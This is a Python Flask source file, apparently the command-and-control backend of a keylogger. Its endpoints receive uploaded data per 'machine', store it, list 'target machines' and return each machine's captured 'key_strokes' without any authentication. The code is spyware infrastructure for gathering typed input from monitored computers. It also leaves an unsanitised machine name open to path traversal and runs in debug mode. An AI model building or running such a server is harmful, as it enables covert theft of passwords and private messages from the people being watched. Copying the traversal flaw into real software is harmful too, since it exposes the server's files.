from flask import Flask, jsonify, request, render_template
import time
import os
import logging

app = Flask(__name__)
DATA_FOLDER = "data"
os.makedirs(DATA_FOLDER, exist_ok=True)

# הגדרת הלוגים
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)


def generate_log_filename() -> str:
    return f"log_{int(time.time())}.txt"


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/api/upload', methods=['POST'])
def upload():
    data = request.get_json()
    if not data or not all(k in data for k in ("machine", "data")):
        logging.warning("Payload dont work: %s", data)
        return jsonify({"error": "Invalid payload"}), 400

    machine = data["machine"]
    machine_folder = os.path.join(DATA_FOLDER, machine)
    os.makedirs(machine_folder, exist_ok=True)

    file_path = os.path.join(machine_folder, generate_log_filename())
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(data["data"])

    logging.info("new file save in machin '%s': %s", machine, file_path)

    return jsonify({"status": "success", "file": file_path}), 200
#קבלת לוגים בחזרה

@app.route('/api/get_target_machines_list/', methods=['GET'])
def get_target_machines_list():
    if not os.path.exists(DATA_FOLDER):
        return jsonify([]), 200
    machines=[name for name in os.listdir(DATA_FOLDER)
              if os.path.isdir(os.path.join(DATA_FOLDER,name))]
    return jsonify(machines), 200
#קבלת מידע לפי מחשבים


@app.route('/api/get_target_machine_key_strokes', methods=['GET'])
def get_target_machine_key_strokes():
    target_machine = request.args.get("machine")
    if not target_machine:
        return jsonify({"error": "Missing 'machine' parameter"}), 400

    machine_folder = os.path.join(DATA_FOLDER, target_machine)
    if not os.path.exists(machine_folder):
        return jsonify({"error": "Machine not found"}), 404

    key_strokes = []
    for filename in sorted(os.listdir(machine_folder)):
        file_path = os.path.join(machine_folder, filename)
        if os.path.isfile(file_path):
            with open(file_path, "r", encoding="utf-8") as f:
                content = f.read()
                key_strokes.append({"file": filename, "data": content})

    return jsonify(key_strokes), 200


if __name__ == '__main__':

    app.run(debug=True)

